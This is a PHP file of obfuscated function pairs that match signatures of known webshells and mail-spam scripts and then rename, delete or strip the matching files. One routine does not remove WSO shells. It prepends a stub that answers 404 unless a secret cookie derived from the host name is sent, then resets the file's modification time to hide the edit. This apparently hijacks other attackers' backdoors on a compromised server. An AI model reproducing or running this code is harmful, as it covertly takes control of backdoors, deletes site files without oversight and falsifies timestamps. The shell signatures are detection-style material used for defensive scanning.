function rnolnf($content)
{
if (strpos($content, " = mail(\$_POST[") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(base64_decode(") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(stripslashes(\$") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(stripslashes(\$") !== FALSE)
{
    return TRUE;
}

if (strpos($content, "mail") !== FALSE && substr_count($content, "stripslashes(base64_decode(\$_POST[") == 4)
{
    return TRUE;
}

if (strpos($content, "eval(\"return eval(\"\$code\");\") ?>") !== FALSE)
{
    return TRUE;
}

if (strpos($content, "if(isset(\$_POST[\"msgbody\"]))") !== FALSE && strpos($content, "if(isset(\$_POST[\"msgsubject\"]))") !== FALSE)
{
    return TRUE;
}


return FALSE;
}
function gbbdzb($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rwwywmtif($content)
{
if (strpos($content, "eval") !== FALSE)
{
    $brace1 = substr_count($content, "{");
    $brace2 = substr_count($content, "(");
    if (($brace1 == 3 || $brace1 == 2) && ($brace2 == 6 || $brace2 == 4))
    {
        return TRUE;
    }
}

return FALSE;
}
function ghipkt($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rxtshkjtiyn($content)
{
if (strpos($content, "if(mail(\$MailTo,") !== FALSE)
{
    if (substr_count($content, ")") == 14)
    {
        return TRUE;
    }
}

return FALSE;
}
function gzowylfiqp($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rumyay($content)
{
if (strpos($content, ";eval(\$") !== FALSE)
{
    if (substr_count($content, ")") == 6)
    {
        return TRUE;
    }
}

return FALSE;
}
function gpuksfjnd($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rimizk($content)
{
if (strpos($content, "<?php @eval(\$_POST[") !== FALSE)
{
    return TRUE;
}

return FALSE;

}
function gehh($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rnmyb($content)
{
if (strpos($content, "http://www.fopo.com.ar/") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gqpoxx($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rkfb($content)
{
$auth_token = md5(md5($_SERVER['HTTP_HOST']) . $_SERVER['HTTP_HOST'] . "salt1I*@#31RTds34+543sf");

$s1 = strpos($content, "FilesMan");
$s2 = strpos($content, "WSOsetcookie");

$s3_1 = strpos($content, "default_use_ajax");
$s3_2 = strpos($content, "default_action");

if (($s1 !== FALSE || $s2 !== FALSE || ($s3_1 !== FALSE && $s3_2 !== FALSE)) and strpos($content, $auth_token) === FALSE) 
{
    return TRUE;
}

return FALSE;
}
function gwvcl($path)
{
$auth_token = md5(md5($_SERVER['HTTP_HOST']) . $_SERVER['HTTP_HOST'] . "salt1I*@#31RTds34+543sf");
$space_str = "";
for ($i=0; $i<512; $i++) {$space_str .= " ";}
$payload = "<" . "?php " . $space_str . " if (!isset(\$_COOKIE['[AUTH]'])) {header('HTTP/1.0 404 Not Found');exit;} ?> ";
$payload = str_replace('[AUTH]', $auth_token, $payload);
$data = @file_get_contents($path);

$mod_time = @stat($path);
@unlink($path);
@file_put_contents($path, $payload . $data);
if ($mod_time)
{
    @touch($path, $mod_time['mtime']);
}

}
function rwcpa($content)
{
if (strpos($content, "  ,\"") !== FALSE && strpos($content, "\";\$") !== FALSE && strpos($content, "'\".\$") !== FALSE && substr_count($content, " = \"") == 3)
{
    return TRUE;
}

return FALSE;
}
function guqt($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rkfikhrjfwk($content)
{
if (substr_count($content, ".chr(") > 20 && substr_count($content, "\n") < 10)
{
    return TRUE;
}
return FALSE;
}
function gsmsydw($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rjbc($content)
{
if (strpos($content, "<?php \$") === 0 && substr_count($content, ";\$") == 7)
{
    return TRUE;
}

return FALSE;
}
function gbbx($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rtguslah($content)
{
if (strpos($content, "};eval(\$") !== FALSE && substr_count($content, "}.\$") == 21 && substr_count($content, "};\$") == 4)
{
    return TRUE;
}

return FALSE;
}
function ggtomkb($path)
{
$content = @file_get_contents($path);

$start = strpos($content, "<" . "?php");
if ($start !== FALSE)
{
    $stop = strpos($content, "?" . ">", $start);
    $payload_pos = strpos($content, "};eval(\$");

    if ($stop != FALSE && $payload_pos !== FALSE && $payload_pos < $stop)
    {
        $stop += 2;
        @file_put_contents($path, substr($content, $stop));
    }
}
}
function rkzbocsidc($content)
{
if (substr_count($content, "].\$") == 15 && substr_count($content, ").\"") >= 9)
{
    return TRUE;
}

return FALSE;
}
function gvnkzpo($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rczw($content)
{
if (strpos($content, "echo \"file test okay\";") !== FALSE && strpos($content, "if( isset(\$_REQUEST[\"test_url\"]) ){") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gfcxqheahuo($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rrqoyc($content)
{
if ((strpos($content, "eval") !== FALSE || strpos($content, "preg_replace") !== FALSE || strpos($content, "_REQUEST") !== FALSE || strpos($content, "_PO") !== FALSE) && substr_count($content, "\n") <= 1 && strlen($content) < 1000)
{
    return TRUE;
}

return FALSE;
}
function guvwcibve($path)
{
return;
}
function rmysakymvc($content)
{
if (strpos($content, "null==getCookie(\"__cfgoid\")&&(setCookie(\"__cfgoid\",1,1),") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gxtakn($path)
{
return;
}
function rehtdp($content)
{
if (strpos($content, " = \"\\x69\\x6e\\x74\\x76\\x61\\x6c\"; \$") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function ghrmq($path)
{
return;
}
function rfxteopseot($content)
{
if (strpos($content, "\$wp_enc_file = '<" . "?php eval(\"") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gpwvxfmg($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rgdrhrdhefv($content)
{
if (strpos($content, "\treturn @gzinflate") !== FALSE && strpos($content, "'] : (isset(\$_COOKIE['") !== FALSE && strpos($content, "<form method=\"post\" action=\"\">") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gzikimlvdk($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rxld($content)
{
if (strpos($content, "urldecode(\"%6E1%7A%62%2F%6D%615%5C%76") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gkefzntrnfl($path)
{
return;
}
function rfzx($content)
{
if (strpos($content, "\"));'); \$strings(\$light);") !== FALSE || strpos($content, "@\$strings(str_rot13('riny(") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function geodj($path)
{
return;
}
function rxapr($content)
{
if (strpos($content, "\$f = \$a(\"\", \$array_name(\$string));") !== FALSE && strpos($content, "MALWARE") === FALSE)
{
    return TRUE;
}
return FALSE;
}
function ggqirdrl($path)
{
return;
}
function rypyifw($content)
{
if (strpos($content, "if( isset(\$_POST['_f_wp']) ) @setcookie( '_f_wp', \$_POST['_f_wp'] );") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gvvpsgdl($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rlhqinkyhbg($content)
{
if (strpos($content, "<" . "?php eval(gzinflate(base64_decode('") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function giixw($path)
{
return;
}
function rydsylijt($content)
{
if (substr_count($content, "].\$") == 15 && strpos($content, "FilesMan") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gwlrjngw($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rmzo($content)
{
if (substr_count($content, "} . \$") == 36)
{
    return TRUE;
}
return FALSE;
}
function goqz($path)
{
return;
}
function raqb($content)
{
if (strpos($content, "\'#ListChecker#i\', \'#MSIECrawler#i\', \'#NetCache#i\', \'#Nutch#i\'") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gplpos($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rfbtpgy($content)
{
if (substr_count($content, "return \"{\$") > 50)
{
    return TRUE;
}
return FALSE;

}
function gkqxly($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rkdastbak($content)
{
if (strpos($content, " }eval(") !== FALSE && strpos($content, "\$i] = chr(ord(\$") !== FALSE && strpos($content, "=gzinflate(\$code($") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function glri($path)
{
return;
}
function rrzajdf($content)
{
if (strpos($content, "ms_not_installed") !== FALSE && strpos($content, "\$id = \$_POST['id']") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gpnva($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rlnifyt($content)
{
if (strpos($content, "if(!\$ping){post_mch(\$sd,'C1',\$rel);}") !== FALSE)
{
    return TRUE;
}
}
function gskq($path)
{
return;
}
function rdyrb($content)
{
if (strpos($content, "if (is_array(\$s) && (count(\$s) > 0) && isset(\$s[0]['txt']) && strlen(\$s[0]['txt']))") !== FALSE)
{
    return TRUE;
}

}
function gkjriqfy($path)
{
return;
}
function rakbvowti($content)
{
if (strpos($content, "{\$r='';for(\$i=0;\$i<strLen(\$p);\$i+=2){\$r.=chr(hexdec(\$p[\$") !== FALSE)
{
    return TRUE;
}
}
function gkbjkorfbpn($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rlwmt($content)
{
if (strpos($content, "z0=\$_REQUEST['sort'];\$q1='';\$c2=\"wt8m4;") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gzqm($path)
{
return;
}
function ruzusu($content)
{
if (strpos($content, "aWYoISRfQ09PS0lFW") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gdnvtpcfidj($path)
{
return;
}
function rlntmhwb($content)
{
if (strpos($content, "error_reporting(E_ALL);\$DOMAIN_FNAME1_7QNG") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function ggfpitzqjfg($path)
{
return;
}
function rhdpz($content)
{
if (strpos($content, "@ini_restore('error_log'); @ini_restore('display_errors'); /*") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gxvmvgzyn($path)
{
return;
}
function rjmpguxj($content)
{
if (strpos($content, "<" . "?php eval(gzuncompress(base64_decode('eNq") !== FALSE) 
{
    return TRUE;
}
return FALSE;

}
function gobjqggzcf($path)
{
return;
}
function rqxc($content)
{
if (strpos($content, "};}}return $") !== FALSE && strpos($content, "'.''.''.''.'") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gihhjhn($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rdfjs($content)
{
if (strpos($content, "function wp_sessiion_init(\$ytd){") !== FALSE && strpos($content, "='base64_decode';") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gyryebpfrps($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rgqlrvck($content)
{
$sig_3 = "<" . "?php eval(base64_decode('JGY9ZGlybmFtZSh";
if (strpos($content, $sig_3) !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gkfcrcmuyl($path)
{
return;
}
function rppxu($content)
{
$sig_2 = "if(\$_GET[\"login\"]==\"cmd\"){if(\$_POST['";
if (strpos($content, $sig_2) !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gkzisugq($path)
{
return;
}
function rxlijqm($content)
{
if (strpos($content, "//header('Content-Type:text/html; charset=utf-8');") !== FALSE && strpos($content, "global \$symbol_url") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gkaolkhze($path)
{
return;
}
function rmwauh($content)
{
if (strpos($content, "<script language=javascript>eval(String.fromCharCode(118, 97, 114, 32,") !== FALSE)
{ 
    return TRUE; 
} 

return FALSE;
}
function gdsacgevinf($path)
{
return;
}
function rkfivu($content)
{
if (strpos($content, "='';@eval(base64_decode('QG9iX3N0YXJ0K") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gbdwneanftk($path)
{
return;
}
function rcxtz($content)
{
 if (strpos($content, "@include_once('/") !== FALSE && strpos($content, $_SERVER["DOCUMENT_ROOT"]) !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gacxz($path)
{
return;
}
function rvqh($content)
{
if (strpos($content, "eval(gzuncompress(base64_decode('eNp") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gdgukrbehju($path)
{
return;
}
function rcoytodsrrd($content)
{
if (strpos($content, "('Content-Type:text/html;charset=utf-8');if(!function_exists('str_ireplace')") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gbuv($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rswkjnyn($content)
{
if (strpos($content, "preg_match('#<img src=\"data:image/png;base64,(.*)\">#'") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gkiyqset($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rwsytjpvg($content)
{
if (strpos($content, "\$meta = 'c'.'hr';") !== FALSE && strpos($content, "@\$docRoot(\$name(\$first,\$second));") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfcydabzk($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rdxkiz($content)
{
if (strpos($content, "# Esecuzione di un comando") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gjghi($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rwjztszlg($content)
{
if (strpos($content, "function assert_main_php (\$domain, \$main_php, \$dir)") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gvwlgbq($path)
{
return;
}
function rvnvf($content)
{
if (strpos($content, "('', '}'.\$") !== FALSE && strpos($content, "?php function ") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gjplq($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rbxkag($content)
{
if (strpos($content, "\$_FILES[\"filename\"][\"tmp_name\"]") !== FALSE && strpos($content, "Your IP: ") !== FALSE && strpos($content, "move_uploaded_file") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gnyd($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rsngzuo($content)
{
if (strpos($content, "script_name)) { echo '~Client has been activated") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function grdnnlnmss($path)
{
return;
}
function rfix($content)
{
if (strpos($content, "<" . "?php /* WSO [2.6]  */\$") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function goftac($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function ryacdw($content)
{
if (strpos($content, "password: Xclusiv-3D") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfozbmtfj($path)
{
return;
}
function rkciot($content)
{
if (strpos($content, "\$sempax = 'eJzs") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gtkedulcv($path)
{
return;
}
function rusvddsrshz($content)
{
if (strpos($content, "Q2k4cUNpQXFJRkpGVmtsV") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gmxfpvhb($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rejecbo($content)
{
if (strpos($content, "\"));return;?" . ">") !== FALSE && strpos($content, "\";eval(base64_decode(\"") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfynsbf($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rikeinq($content)
{
if (strpos($content, "{ \$x = ''; for (\$i = 0, \$n = strlen(\$s); \$i < \$n; \$i += 2)") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfzqmk($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}

